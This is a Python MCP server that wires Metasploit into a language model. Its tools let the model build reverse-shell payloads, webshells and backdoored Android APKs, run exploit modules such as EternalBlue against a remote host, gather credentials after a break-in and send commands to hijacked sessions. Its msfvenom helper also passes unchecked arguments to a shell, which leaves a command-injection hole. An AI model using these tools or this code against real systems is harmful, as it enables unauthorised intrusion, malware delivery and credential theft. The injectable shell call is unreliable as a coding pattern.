#!/usr/bin/env python3
"""MCP Metasploit Server — bridges LLM to msfvenom + msfconsole.

Exposes Metasploit Framework capabilities as MCP tools:
- msfvenom: Payload generation
- msfconsole: Exploit execution, session management
- Resource scripts: Automated attack chains

Usage:
    python3 mcp_metasploit.py
"""

import os
import subprocess
import json
import sys
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("metasploit-tools")


# ============================================================
# Helper: Run msfconsole command via -x flag
# ============================================================

def _run_msfconsole(command: str, timeout: int = 60) -> str:
    """Run a command via msfconsole -x flag."""
    try:
        result = subprocess.run(
            ["msfconsole", "-x", f"{command}; exit"],
            capture_output=True,
            text=True,
            timeout=timeout,
            stdin=subprocess.DEVNULL,
        )
        output = (result.stdout or "") + (result.stderr or "")
        # Filter out banner noise — keep relevant output
        lines = output.split('\n')
        relevant = []
        skip_banner = True
        for line in lines:
            if skip_banner:
                if "=[ metasploit" in line.lower():
                    continue
                if "===" in line and len(line) > 20:
                    continue
                if line.strip() == "":
                    continue
                skip_banner = False
            relevant.append(line)
        return '\n'.join(relevant).strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return f"[TIMEOUT] Command exceeded {timeout}s"
    except Exception as e:
        return f"[ERROR] {type(e).__name__}: {e}"


def _run_msfvenom(args: str, timeout: int = 30) -> str:
    """Run msfvenom with given arguments."""
    try:
        cmd = f"msfvenom {args}"
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            stdin=subprocess.DEVNULL,
        )
        output = (result.stdout or "") + (result.stderr or "")
        # For binary payloads, show info only
        if result.returncode == 0:
            # Show what was generated
            return f"[+] Payload generated successfully\nCommand: {cmd}\n\n{output}"
        return output.strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return f"[TIMEOUT] Command exceeded {timeout}s"
    except Exception as e:
        return f"[ERROR] {type(e).__name__}: {e}"


# ============================================================
# MSFVENOM TOOLS
# ============================================================

@mcp.tool()
def msfvenom_list_payloads(platform: str = "", arch: str = "") -> str:
    """List available msfvenom payloads.

    Args:
        platform: Filter by platform (windows, linux, android, python, php, etc.)
        arch: Filter by architecture (x86, x64, armle, aarch64, etc.)
    """
    args = "--list payloads"
    if platform:
        args += f" platform={platform}"
    if arch:
        args += f" arch={arch}"

    output = _run_msfvenom(args)
    return output[:10000]  # Truncate large output


@mcp.tool()
def msfvenom_list_formats() -> str:
    """List available output formats for payloads."""
    return _run_msfvenom("--list formats")[:5000]


@mcp.tool()
def msfvenom_list_encoders() -> str:
    """List available encoders for payload obfuscation."""
    return _run_msfvenom("--list encoders")[:5000]


@mcp.tool()
def msfvenom_generate_payload(
    payload: str,
    lhost: str = "",
    lport: str = "4444",
    format: str = "",
    encoder: str = "",
    iterations: int = 0,
    platform: str = "",
    arch: str = "",
    output_file: str = "",
    bad_chars: str = "",
    extra_args: str = "",
) -> str:
    """Generate a Metasploit payload using msfvenom.

    Args:
        payload: Payload name (e.g., windows/x64/meterpreter/reverse_tcp)
        lhost: Local host IP for reverse connections
        lport: Local port (default: 4444)
        format: Output format (raw, exe, elf, asp, aspx, war, python, etc.)
        encoder: Encoder to use (e.g., x86/shikata_ga_nai)
        iterations: Number of encoding iterations
        platform: Target platform (windows, linux, android, etc.)
        arch: Target architecture (x86, x64, armle, etc.)
        output_file: Save payload to file path
        bad_chars: Characters to avoid (e.g., \\x00\\x0a\\x0d)
        extra_args: Additional msfvenom arguments
    """
    args = f"-p {payload}"

    if lhost:
        args += f" LHOST={lhost}"
    args += f" LPORT={lport}"

    if format:
        args += f" -f {format}"
    if encoder:
        args += f" -e {encoder}"
    if iterations > 0:
        args += f" -i {iterations}"
    if platform:
        args += f" --platform {platform}"
    if arch:
        args += f" -a {arch}"
    if bad_chars:
        args += f" -b {bad_chars}"
    if output_file:
        args += f" -o {output_file}"
    if extra_args:
        args += f" {extra_args}"

    return _run_msfvenom(args)


@mcp.tool()
def msfvenom_generate_shellcode(
    payload: str,
    lhost: str = "",
    lport: str = "4444",
    format: str = "c",
    bad_chars: str = "\\x00",
    encoder: str = "",
    iterations: int = 0,
) -> str:
    """Generate shellcode for exploit development.

    Args:
        payload: Payload name (e.g., linux/x64/shell_reverse_tcp)
        lhost: Local host IP
        lport: Local port (default: 4444)
        format: Output format (c, python, ruby, js_be, js_le, hex)
        bad_chars: Characters to exclude
        encoder: Encoder to use
        iterations: Number of encoding iterations
    """
    args = f"-p {payload}"
    if lhost:
        args += f" LHOST={lhost}"
    args += f" LPORT={lport}"
    args += f" -f {format}"
    args += f" -b {bad_chars}"
    if encoder:
        args += f" -e {encoder}"
    if iterations > 0:
        args += f" -i {iterations}"

    return _run_msfvenom(args)


@mcp.tool()
def msfvenom_generate_webshell(
    payload: str = "php/meterpreter/reverse_tcp",
    lhost: str = "",
    lport: str = "4444",
    format: str = "raw",
    output_file: str = "shell.php",
) -> str:
    """Generate a webshell payload (PHP, ASP, ASPX, JSP, WAR).

    Args:
        payload: Web payload (php/meterpreter/reverse_tcp, java/jsp_shell_reverse_tcp, etc.)
        lhost: Local host IP
        lport: Local port (default: 4444)
        format: Output format (raw, war, etc.)
        output_file: Output file path
    """
    args = f"-p {payload} LHOST={lhost} LPORT={lport} -f {format} -o {output_file}"
    return _run_msfvenom(args)


@mcp.tool()
def msfvenom_generate_android_apk(
    lhost: str = "",
    lport: str = "4444",
    output_file: str = "payload.apk",
    original_apk: str = "",
) -> str:
    """Generate an Android APK payload.

    Args:
        lhost: Local host IP
        lport: Local port (default: 4444)
        output_file: Output APK path
        original_apk: Path to original APK to inject into (optional)
    """
    args = f"-p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output_file}"
    if original_apk:
        args += f" -x {original_apk}"
    return _run_msfvenom(args)


# ============================================================
# MFSCONSOLE TOOLS
# ============================================================

@mcp.tool()
def msfconsole_execute(command: str, timeout: int = 120) -> str:
    """Execute a command in msfconsole.

    Args:
        command: msfconsole command (e.g., 'use exploit/multi/handler', 'show options')
        timeout: Timeout in seconds (default: 120)
    """
    return _run_msfconsole(command, timeout)


@mcp.tool()
def msfconsole_start_handler(
    payload: str = "multi/handler",
    lhost: str = "",
    lport: str = "4444",
    handler_type: str = "reverse_tcp",
    run: bool = False,
) -> str:
    """Start a Metasploit handler (multi/handler) to catch reverse connections.

    Args:
        payload: Handler payload (default: multi/handler)
        lhost: Local host IP to listen on
        lport: Local port to listen on (default: 4444)
        handler_type: Handler type (reverse_tcp, reverse_https, reverse_http, bind_tcp)
        run: If True, run the handler in background
    """
    commands = f"use exploit/multi/handler; "
    commands += f"set PAYLOAD {payload}; "
    commands += f"set LHOST {lhost}; "
    commands += f"set LPORT {lport}; "

    if handler_type == "reverse_https":
        commands += "set HandlerSSLCert /tmp/cert.pem; "
    elif handler_type == "bind_tcp":
        commands += f"set RHOST {lhost}; "

    if run:
        commands += "run -j; "
    else:
        commands += "show options; "

    return _run_msfconsole(commands, timeout=30)


@mcp.tool()
def msfconsole_search(query: str, search_type: str = "") -> str:
    """Search Metasploit modules.

    Args:
        query: Search term (e.g., 'eternalblue', 'smb', 'apache')
        search_type: Filter by type (exploit, auxiliary, payload, encoder, nop, post)
    """
    if search_type:
        cmd = f"search -t {search_type} {query}"
    else:
        cmd = f"search {query}"
    return _run_msfconsole(cmd, timeout=30)[:10000]


@mcp.tool()
def msfconsole_exploit(
    module: str,
    rhost: str = "",
    rport: str = "",
    payload: str = "",
    lhost: str = "",
    lport: str = "4444",
    options: str = "",
    run: bool = True,
) -> str:
    """Execute a Metasploit exploit module.

    Args:
        module: Exploit module path (e.g., exploit/windows/smb/ms17_010_eternalblue)
        rhost: Remote target host
        rport: Remote target port
        payload: Payload to use (e.g., windows/x64/meterpreter/reverse_tcp)
        lhost: Local host for reverse connection
        lport: Local port for reverse connection (default: 4444)
        options: Additional options as key=value pairs (comma-separated)
        run: If True, execute the exploit
    """
    commands = f"use {module}; "

    if rhost:
        commands += f"set RHOSTS {rhost}; "
    if rport:
        commands += f"set RPORT {rport}; "
    if payload:
        commands += f"set PAYLOAD {payload}; "
    if lhost:
        commands += f"set LHOST {lhost}; "
    if lport:
        commands += f"set LPORT {lport}; "

    # Parse additional options
    if options:
        for opt in options.split(","):
            opt = opt.strip()
            if "=" in opt:
                key, val = opt.split("=", 1)
                commands += f"set {key.strip()} {val.strip()}; "

    if run:
        commands += "exploit; "
    else:
        commands += "show options; "

    return _run_msfconsole(commands, timeout=180)


@mcp.tool()
def msfconsole_auxiliary(
    module: str,
    rhost: str = "",
    rport: str = "",
    options: str = "",
    run: bool = True,
) -> str:
    """Execute a Metasploit auxiliary module (scanner, enum, etc.).

    Args:
        module: Auxiliary module path (e.g., auxiliary/scanner/smb/smb_login)
        rhost: Remote target host
        rport: Remote target port
        options: Additional options as key=value pairs (comma-separated)
        run: If True, execute the module
    """
    commands = f"use {module}; "

    if rhost:
        commands += f"set RHOSTS {rhost}; "
    if rport:
        commands += f"set RPORT {rport}; "

    if options:
        for opt in options.split(","):
            opt = opt.strip()
            if "=" in opt:
                key, val = opt.split("=", 1)
                commands += f"set {key.strip()} {val.strip()}; "

    if run:
        commands += "run; "
    else:
        commands += "show options; "

    return _run_msfconsole(commands, timeout=180)


@mcp.tool()
def msfconsole_post(
    module: str,
    session: str = "",
    options: str = "",
    run: bool = True,
) -> str:
    """Execute a Metasploit post-exploitation module.

    Args:
        module: Post module path (e.g., post/windows/gather/credentials)
        session: Session ID to run against
        options: Additional options as key=value pairs (comma-separated)
        run: If True, execute the module
    """
    commands = f"use {module}; "

    if session:
        commands += f"set SESSION {session}; "

    if options:
        for opt in options.split(","):
            opt = opt.strip()
            if "=" in opt:
                key, val = opt.split("=", 1)
                commands += f"set {key.strip()} {val.strip()}; "

    if run:
        commands += "run; "
    else:
        commands += "show options; "

    return _run_msfconsole(commands, timeout=180)


@mcp.tool()
def msfconsole_sessions() -> str:
    """List active Metasploit sessions."""
    return _run_msfconsole("sessions -l", timeout=15)


@mcp.tool()
def msfconsole_session_command(session: str, command: str) -> str:
    """Execute a command on an active Metasploit session.

    Args:
        session: Session ID
        command: Command to execute on the session
    """
    return _run_msfconsole(f"sessions -c {command} -i {session}", timeout=30)


@mcp.tool()
def msfconsole_resource_script(script_path: str) -> str:
    """Execute a Metasploit resource script (.rc file).

    Args:
        script_path: Path to the .rc resource script
    """
    return _run_msfconsole(f"resource {script_path}", timeout=300)


@mcp.tool()
def msfconsole_db_status() -> str:
    """Check Metasploit database status."""
    return _run_msfconsole("db_status", timeout=15)


@mcp.tool()
def msfconsole_workspace(name: str = "") -> str:
    """Manage Metasploit workspaces.

    Args:
        name: Workspace name (empty to list all)
    """
    if name:
        return _run_msfconsole(f"workspace -a {name}", timeout=15)
    return _run_msfconsole("workspace", timeout=15)


@mcp.tool()
def msfconsole_hosts(action: str = "list", host: str = "") -> str:
    """Manage hosts in Metasploit database.

    Args:
        action: Action (list, add, delete)
        host: Host IP/address
    """
    if action == "list":
        return _run_msfconsole("hosts", timeout=15)
    elif action == "add" and host:
        return _run_msfconsole(f"hosts -a {host}", timeout=15)
    elif action == "delete" and host:
        return _run_msfconsole(f"hosts -d {host}", timeout=15)
    return "Invalid action or missing host parameter"


@mcp.tool()
def msfconsole_services(port: str = "", protocol: str = "") -> str:
    """List services in Metasploit database.

    Args:
        port: Filter by port number
        protocol: Filter by protocol (tcp, udp)
    """
    cmd = "services"
    if port:
        cmd += f" -p {port}"
    if protocol:
        cmd += f" -r {protocol}"
    return _run_msfconsole(cmd, timeout=15)


@mcp.tool()
def msfconsole_version() -> str:
    """Get Metasploit Framework version."""
    return _run_msfconsole("version", timeout=10)


# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    mcp.run()
